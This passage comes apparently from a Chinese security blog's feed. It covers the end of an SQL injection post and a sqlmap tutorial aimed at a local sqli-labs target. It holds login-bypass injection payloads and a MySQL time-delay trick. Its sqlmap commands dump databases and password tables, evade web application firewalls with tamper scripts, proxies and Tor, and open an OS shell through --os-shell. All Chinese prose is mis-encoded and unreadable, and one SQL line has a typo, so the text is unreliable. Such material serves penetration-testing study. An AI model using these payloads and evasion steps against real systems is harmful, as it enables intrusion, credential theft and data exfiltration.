(<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p><p>å¯¹<code>SpongeBob</code>å˜é‡â€œä¸Šé”â€ï¼Œç”±äº<code>SpongeBob</code>å˜é‡æœ¬èº«æ²¡æœ‰è¢«é”å®šï¼Œå› æ­¤æ˜¯ä¸ä¼šæœ‰æ—¶é—´å»¶é•¿ï¼Œåˆ©ç”¨å¦ä¸€ä¸ªMySQLè¿æ¥è®¿é—®<code>SpongeBob</code>å˜é‡ï¼Œæ‰§è¡Œå¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> get_locck(<span class="string">&#x27;SPongeBob&#x27;</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> æ‰§è¡Œç»“æœ</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">5</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">5</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                   <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æŸ¥è¯¢ç­‰å¾…5ç§’æ‰è¿›è¡Œè¿”å›ï¼Œå› æ­¤å¯ä»¥ç”¨äºæ—¶é—´æ³¨å…¥</p><p><strong>æ³¨æ„ï¼šè¯¥æ–¹æ³•éœ€è¦ä¸æ•°æ®åº“ä¹‹é—´å»ºç«‹é•¿è¿æ¥ï¼Œä¹Ÿå°±æ˜¯PHPä¸­çš„<code>mysql_pconnect</code>å‡½æ•°æ‰€å¯ç”¨çš„è¿æ¥</strong></p><h2 id="å¸¸è§çš„ä¸‡èƒ½å¯†ç "><a href="#å¸¸è§çš„ä¸‡èƒ½å¯†ç " class="headerlink" title="å¸¸è§çš„ä¸‡èƒ½å¯†ç "></a>å¸¸è§çš„ä¸‡èƒ½å¯†ç </h2><div class="table-container"><table><thead><tr><th>åºå·</th><th>ä¸‡èƒ½å¯†ç </th></tr></thead><tbody><tr><td>1</td><td>aâ€™ or â€˜aâ€™=â€™a</td></tr><tr><td>2</td><td>aâ€™ or 1 #</td></tr><tr><td>3</td><td>aâ€ or â€œaâ€=â€a</td></tr><tr><td>4</td><td>123 or 1</td></tr><tr><td>5</td><td>aâ€™â€™â€™ or â€˜â€™â€™aâ€™â€™â€™=â€™â€™â€™a</td></tr><tr><td>6</td><td>â€˜orâ€™</td></tr><tr><td>7</td><td>&amp;mo#</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2023/07/26/sqlmap/"/>
      <url>/2023/07/26/sqlmap/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><p><strong>SQLMapæ”¯æŒå¸‚é¢ä¸Šå¸¸è§çš„æ•°æ®åº“ï¼š</strong></p><p>æ”¯æŒMySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybaseå’ŒSAP MaxDBç­‰æ•°æ®åº“çš„å„ç§å®‰å…¨æ¼æ´æ£€æµ‹ã€‚åŸºæœ¬ä¸Šåœ¨è¿›è¡Œæ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬èƒ½è§åˆ°çš„æ•°æ®åº“éƒ½èƒ½è¿›è¡Œæµ‹è¯•</p><p><strong>SQLMapæ”¯æŒå¤šç§æ³¨å…¥æ‰‹æ³•ï¼š</strong></p><ul><li>åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ï¼›</li><li>åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ï¼›</li><li>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ï¼›</li><li>è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨ union çš„æƒ…å†µä¸‹çš„æ³¨å…¥ï¼›</li><li>å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥</li></ul><p><strong>SQLMapæ”¯æŒå¤šç§åŠŸèƒ½ï¼š</strong></p><p>æ•°æ®åº“æŒ‡çº¹è¯†åˆ«ã€æ•°æ®åº“æšä¸¾ã€æ•°æ®æå–ã€è®¿é—®ç›®æ ‡æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨è·å–å®Œå…¨çš„æ“ä½œæƒé™æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h1 id="å¸¸ç”¨å‚æ•°ä»‹ç»"><a href="#å¸¸ç”¨å‚æ•°ä»‹ç»" class="headerlink" title="å¸¸ç”¨å‚æ•°ä»‹ç»"></a>å¸¸ç”¨å‚æ•°ä»‹ç»</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">-v  #è¯¦ç»†çš„ç­‰çº§(0-6) </span><br><span class="line">    0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚ </span><br><span class="line">    1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚ </span><br><span class="line">    2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚ </span><br><span class="line">    3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚ </span><br><span class="line">    4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ </span><br><span class="line">    5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ </span><br><span class="line">    6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ </span><br><span class="line">    å»ºè®®ä½¿ç”¨ç­‰çº§ 3 ï¼Œå¯ä»¥çœ‹åˆ°æ³¨å…¥è¯­å¥çš„Payloadï¼Œåˆ©äºå…¥é—¨è€…å­¦ä¹ ã€‚</span><br><span class="line"> </span><br><span class="line">-u &quot;http://xxx/Less-1/?id=1&quot; æ³¨å…¥ç‚¹</span><br><span class="line"> </span><br><span class="line">-f  #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹</span><br><span class="line"> </span><br><span class="line">-b  #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ </span><br><span class="line"> </span><br><span class="line">-p  #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line"> </span><br><span class="line">--level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 level ç®—æ˜¯ä¸€å…±æ³¨å…¥æµ‹è¯•ç­‰çº§ï¼Œä¸€å…±æ˜¯äº”çº§ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ£€æµ‹çš„å†…å®¹ä¹Ÿå°±è¶Šå¤šï¼Œæ£€æµ‹çº§åˆ«å¤§äºç­‰äº 2 æ—¶ä¼šæ£€æµ‹ cookie æ˜¯å¦æœ‰æ³¨å…¥ï¼Œæ£€æµ‹çº§åˆ«å¤§äºç­‰äº 3 æ—¶ä¼šæ£€æµ‹ User-Agent å’Œ Referer æ˜¯å¦æœ‰æ³¨å…¥ã€‚æ¯”è¾ƒæ¨èä½¿ç”¨ 5 ç­‰çº§è¿›è¡Œæµ‹è¯•ï¼Œç¡®ä¿ä¸ä¼šæ¼æ‰æ³¨å…¥ç‚¹ã€‚</span><br><span class="line"> </span><br><span class="line">--risk=(0-3)  #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 ä¸€å…±æœ‰3ä¸ªå±é™©ç­‰çº§ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ è®¤ä¸ºè¿™ä¸ªç½‘ç«™å­˜åœ¨å‡ çº§çš„å±é™©ç­‰çº§ã€‚å’Œæ¢æµ‹ç­‰çº§ä¸€ä¸ªæ„æ€ï¼Œåœ¨ä¸ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œå»ºè®®è®¾ç½®ä¸º3çº§</span><br><span class="line"> </span><br><span class="line">--time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 </span><br><span class="line"> </span><br><span class="line">--data #é€šè¿‡POSTå‘é€æ•°æ® </span><br><span class="line"> </span><br><span class="line">--columns        #åˆ—å‡ºå­—æ®µ </span><br><span class="line"> </span><br><span class="line">--current-user   #è·å–å½“å‰ç”¨æˆ·åç§° </span><br><span class="line"> </span><br><span class="line">--current-db     #è·å–å½“å‰æ•°æ®åº“åç§° </span><br><span class="line"> </span><br><span class="line">--users          #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· </span><br><span class="line"> </span><br><span class="line">--passwords      #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  </span><br><span class="line"> </span><br><span class="line">--privileges     #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) </span><br><span class="line"> </span><br><span class="line">--dbs            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ </span><br><span class="line"> </span><br><span class="line">--tables -D &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ </span><br><span class="line"> </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ </span><br><span class="line"> </span><br><span class="line">--dump-all            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ </span><br><span class="line"> </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) </span><br><span class="line"> </span><br><span class="line">--is-dba      #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ </span><br><span class="line"> </span><br><span class="line">--data &quot;&quot; #POSTæ–¹å¼æäº¤æ•°æ®(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line"> </span><br><span class="line">--cookie &quot;ç”¨;å·åˆ†å¼€&quot;      #cookieæ³¨å…¥(--cookies=â€PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=lowâ€) </span><br><span class="line"> </span><br><span class="line">--referer &quot;&quot;     #ä½¿ç”¨refereræ¬ºéª—(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line"> </span><br><span class="line">--user-agent &quot;&quot;  #è‡ªå®šä¹‰user-agent </span><br></pre></td></tr></table></figure><h1 id="åŸºæœ¬å¿…ä¼šæ“ä½œ"><a href="#åŸºæœ¬å¿…ä¼šæ“ä½œ" class="headerlink" title="åŸºæœ¬å¿…ä¼šæ“ä½œ"></a>åŸºæœ¬å¿…ä¼šæ“ä½œ</h1><p><strong>æµ‹è¯•GETæ³¨å…¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -p &quot;id&quot;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•POSTæ³¨å…¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-11/&quot; --data=&quot;uname=123&amp;passwd=123&quot;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•Cookieæ³¨å…¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://127.0.0.1&quot; --cookie &quot;customerId=591edabaab5b52292042df8a&quot;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•SQLæ³¨å…¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼šç›´æ¥ä¸€æŠŠæ¢­å“ˆ</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-14/&quot; --level=5 --risk=3</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŒ‡å®šæœ€é«˜ levelï¼Œrisk ç­‰çº§ï¼Œè¿™æ ·å¯ä»¥ä¸æ¼æ‰ä»»ä½•ä¸€ä¸ªæµ‹è¯•ç‚¹ï¼Œä½†æ˜¯ä»£ä»·å°±æ˜¯æ¯”è¾ƒæ…¢ã€‚è¿™ä¸ªæƒ…å†µé€‚åˆæ—¶é—´å……è£•ä»¥åŠæœ€åå®Œå…¨æ²¡æœ‰åŠæ³•çš„æ¢­å“ˆç­–ç•¥</p><p><strong>æµ‹è¯•æ•°æ®åŒ…æŒ‡å®šå­—æ®µ</strong></p><p>ä½¿ç”¨BurpSuiteæŠ“å–æ•°æ®åŒ…ï¼Œå¯¹éœ€è¦æµ‹è¯•çš„ä½ç½®åé¢åŠ ä¸Š *</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs/Less-11/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: </span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1/sqli-labs/Less-11/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uname=1*&amp;passwd=1*&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè¯­å¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r test.txt -v 3</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å°±å¯ä»¥å®ç°å¯¹æˆ‘ä»¬æƒ³è¦æµ‹è¯•çš„ä½ç½®è¿›è¡Œæµ‹è¯•</p><p><strong>è·å–æ•°æ®åº“ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --users</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·åå¯†ç ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --passwords</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æ•°æ®åº“å½“å‰ç”¨æˆ·ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --current-user </span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·æ˜¯å¦å…·æœ‰rootæƒé™ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --is-dba</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --tables</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns</span><br><span class="line"> </span><br><span class="line">æŸ¥çœ‹æŒ‡å®šåˆ—ä¸‹çš„æ•°æ®ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump</span><br><span class="line"> </span><br><span class="line">è„±è£¤ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --dump-all #çˆ†å‡ºæ•°æ®åº“securityä¸­çš„usersè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --dump-all   #çˆ†å‡ºæ•°æ®åº“securityä¸­çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dump-all  #çˆ†å‡ºè¯¥æ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®</span><br></pre></td></tr></table></figure><h1 id="é«˜ç«¯ä½¿ç”¨æŒ‡å—"><a href="#é«˜ç«¯ä½¿ç”¨æŒ‡å—" class="headerlink" title="é«˜ç«¯ä½¿ç”¨æŒ‡å—"></a>é«˜ç«¯ä½¿ç”¨æŒ‡å—</h1><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><p>é¦–å…ˆæˆ‘ä»¬åˆ¤æ–­è¯¥Web æœåŠ¡å™¨æ˜¯å¦è¢«WAF/IPS/IDSä¿æŠ¤ç€ã€‚è¿™ç‚¹å¾ˆå®¹æ˜“å®ç°ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨æ¼æ‰«æˆ–è€…ä½¿ç”¨ä¸“é—¨å·¥å…·æ¥æ£€æµ‹æ˜¯å¦æœ‰WAFï¼Œè¿™ä¸ªæ£€æµ‹ï¼Œåœ¨nmap çš„NSEï¼Œæˆ–è€…WVSçš„ç­–ç•¥æˆ–è€…APPSCANçš„ç­–ç•¥ä¸­éƒ½æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›æ¥åˆ¤æ–­<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --thread 10 --identify-waf   //é¦–é€‰</span><br><span class="line">sqlmap -u &quot;&quot; --thread 10 --check-waf      //å¤‡é€‰</span><br></pre></td></tr></table></figure></p><p><strong>ä½¿ç”¨ä»»æ„æµè§ˆå™¨è¿›è¡Œç»•è¿‡ï¼Œå°¤å…¶æ˜¯åœ¨WAFé…ç½®ä¸å½“çš„æ—¶å€™</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --random-agent -v 2</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨HTTP å‚æ•°æ±¡æŸ“è¿›è¡Œç»•è¿‡</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --hpp -v 3</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨é•¿çš„å»¶æ—¶æ¥é¿å…è§¦å‘WAFçš„æœºåˆ¶ï¼Œè¿™æ–¹å¼æ¯”è¾ƒè€—æ—¶</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --delay=3.5 --time-sec=60</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ä»£ç†è¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --proxy=211.211.211.211:8080 --proxy-cred=211:985</span><br></pre></td></tr></table></figure><p><strong>åŒ¿åæ³¨å…¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --tor</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨è„šæœ¬ç»•è¿‡</strong></p><p>sqlmap å®˜æ–¹æä¾›äº†53ä¸ªç»•è¿‡è„šæœ¬ï¼Œè„šæœ¬ç›®å½•åœ¨<code>/sqlmap/tamper</code>ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æŒ‡å®šå•ä¸ªè„šæœ¬ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --tamper=space2plus.py </span><br><span class="line"> </span><br><span class="line">æŒ‡å®šå¤šä¸ªè„šæœ¬ï¼š</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --tamper=&quot;space2comment.py,space2plus.py&quot;</span><br></pre></td></tr></table></figure><h2 id="æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"><a href="#æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"></a>æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</h2><p>åœ¨æ•°æ®åº“ä¸ºMySQLã€PostgreSqlæˆ–è€…SQL Serveræ—¶ï¼Œå¯ä»¥é€šè¿‡sqlmapæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</p><p><strong>å½“ä¸ºMySQLæ•°æ®åº“æ—¶ï¼Œéœ€æ»¡è¶³ä¸‹é¢æ¡ä»¶ï¼š</strong></p><ul><li>å½“å‰ç”¨æˆ·ä¸º root</li><li>çŸ¥é“ç½‘ç«™æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„</li></ul><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --os-shell</span><br></pre></td></tr></table></figure><p>ä¹‹åä¼šè¦æ±‚é€‰æ‹©è„šæœ¬è¯­è¨€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP (default)</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åä¼šè¦æ±‚æˆ‘ä»¬é€‰æ‹©è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">what do you want to use for writable directory?</span><br><span class="line">[1] common location(s) (&#x27;C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/&#x27;) (default)</span><br><span class="line">[2] custom location(s)</span><br><span class="line">[3] custom directory list file</span><br><span class="line">[4] brute force search</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span> </span><br><span class="line">ã€1ã€‘ä½¿ç”¨å…¬å…±çš„é»˜è®¤ç›®å½•(C:/xampp/htdocs/ï¼ŒC:/wamp/wwwï¼ŒC:/Inetpub/wwwroot/)</span><br><span class="line">ã€2ã€‘è‡ªå®šä¹‰ç½‘ç»œæ ¹ç›®å½•ç»å¯¹è·¯å¾„</span><br><span class="line">ã€3ã€‘æŒ‡å®šè‡ªå®šä¹‰çš„è·¯å¾„æ–‡ä»¶</span><br><span class="line">ã€4ã€‘æš´åŠ›ç 